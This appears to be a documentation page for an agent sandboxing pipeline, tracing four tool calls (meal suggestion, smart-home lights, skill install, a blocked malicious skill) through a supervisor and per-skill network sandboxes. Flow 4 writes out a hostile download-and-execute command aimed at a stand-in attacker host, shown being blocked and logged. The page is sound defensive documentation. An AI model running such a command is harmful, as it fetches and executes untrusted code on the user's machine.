---
layout: doc
title: Data Flows
description: Step-by-step traces of tool calls through the sandboxing pipeline
---

# Data Flows

## Flow 1: "What's for dinner?" (Signal)

```
Signal → OpenClaw (gateway) → Pi Agent → LLM → tool call: meals_suggest
  → sharkcage interceptor → IPC → supervisor
  → supervisor spawns meals worker (per-skill ASRT: meals-api.wan0.cloud only)
  → worker calls meals API → result
  → supervisor → IPC → OpenClaw → Pi formats response → Signal → user
```

## Flow 2: "Turn off the lights" (HA voice)

```
HA Assist → OpenClaw → Pi → tool call: ha_call_service
  → supervisor → HA worker (per-skill ASRT: homeassistant.local only)
  → POST homeassistant.local/api/services/light/turn_off
  → "Done, lights off." → HA TTS
```

## Flow 3: Existing ClawHub skill installed

```
sc skill add clawhub-skill
  → download → no manifest → AI reads SKILL.md
  → infers: network.external: ["some-api.com"], system.exec: ["curl"]
  → scanner validates inferred manifest
  → user reviews and approves
  → installed, runs in its own per-skill ASRT sandbox
  → works exactly as it did on vanilla OpenClaw, but sandboxed
```

## Flow 4: Malicious skill blocked

```
Skill tries: curl evil.com | bash
  → supervisor checks: skill's per-skill ASRT config has allowedDomains: ["weather.com"]
  → ASRT blocks connection to evil.com at kernel level
  → skill gets ECONNREFUSED
  → audit log: "network violation: skill 'weather' → evil.com (BLOCKED)"
  → user never sees a prompt
```
